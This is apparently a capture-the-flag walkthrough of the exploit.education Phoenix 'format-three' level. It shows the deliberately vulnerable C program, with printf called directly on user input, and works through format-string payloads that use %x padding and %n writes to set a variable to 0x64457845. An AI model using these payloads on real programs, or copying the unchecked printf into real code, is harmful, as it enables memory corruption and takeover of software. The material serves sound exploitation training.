# FORMAT THREE

## SOURCE CODE

```c
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

## STRATEGY

The challenge is similar to format-two, but now we need to overwrite *`changeme`* with a specific value.
Like in the previous exercise the first thing we need is the changeme address and find the buffer position in the stack, then we will use the "standard way" (because symbol '$', used to direct access to parameters is disabled) and injecting the 4 addresses each separated with 4 junk bytes that serve as arguments for %x. We also need to do the math in order to write the correct number of byte. We will do the math by hand because the current value of *`changeme`* is printed (easy to read) and because is a good exercise but in the next challenge we will let python do the math and we will see how to write a clean and more elegant script.

## EXPLOIT

1. *`changeme`* address:

```shell
user@phoenix-amd64:/opt/phoenix/i486$ objdump -t format-three | grep changeme
08049844 g     O .bss	00000004 changeme
```
	address: 0x08049844

2. buffer position in the stack:

```shell
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "AAAA" + ".%x"*15' | ./format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA.0.0.0.f7f81cf7.f7ffb000.ffffd628.8048556.ffffc620.ffffc620.fff.0.41414141.2e78252e.252e7825.78252e78
Better luck next time - got 0x00000000, wanted 0x64457845!
```
	buffer is at 12th position (so we need 11 %x to access)

3. Now we are ready to set the exploit and find the changeme value to start calculating field widths.

```shell
python -c 'import struct; print struct.pack("I",0x08049844) + "JUNK" + struct.pack("I",0x08049845) + "JUNK" + struct.pack("I",0x08049846) + "JUNK" + struct.pack("I",0x08049847) + "%x"*11 + "%n"' | ./format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
D�JUNKE�JUNKF�JUNKG�000f7f81cf7f7ffb000ffffd6288048556ffffc620ffffc620fff0
Better luck next time - got 0x00000052, wanted 0x64457845!
```
	the initial value is 0x52

4. Let's do the math byte a byte. Just subtract from target values the previous ones except for the first one to which we subtract 0x52.
When you have negative result just add 0x100 like in the first case: 0x45 - 0x52 = negative ! ----> 0x145 - 0x52 = positive!

```
Hex value:
145 – 52 = F3

Decimal value:
325 – 82 = 243	
```
```
Hex value:
78 – 45 = 33

Decimal value:
120 – 69 = 51
```
```
Hex value:
145 – 78 = CD

Decimal value:
325 – 120 = 205
```
```
Hex value:
64 – 45 = 1F

Decimal value:
100 – 69 = 31
```

5. Final exploit:
```shell
python -c 'import struct; print struct.pack("I",0x08049844) + "JUNK" + struct.pack("I",0x08049845) + "JUNK" + struct.pack("I",0x08049846) + "JUNK" + struct.pack("I",0x08049847) + "%x"*10 + "%244x" + "%n" + "%51x" + "%n" + "%205x" + "%n" + "%31x" + "%n"' | ./format-three
```

ALTERNATIVE:

we have written one byte at a time but in the same way it is possible to write 2 at a time, the result is:

```shell
python -c 'import struct; print struct.pack("I",0x08049844) + "JUNK" + struct.pack("I",0x08049846) + "%x"*10 + "%30724x" + "%n" +"%60416x" + "%n"' | ./format-three
```
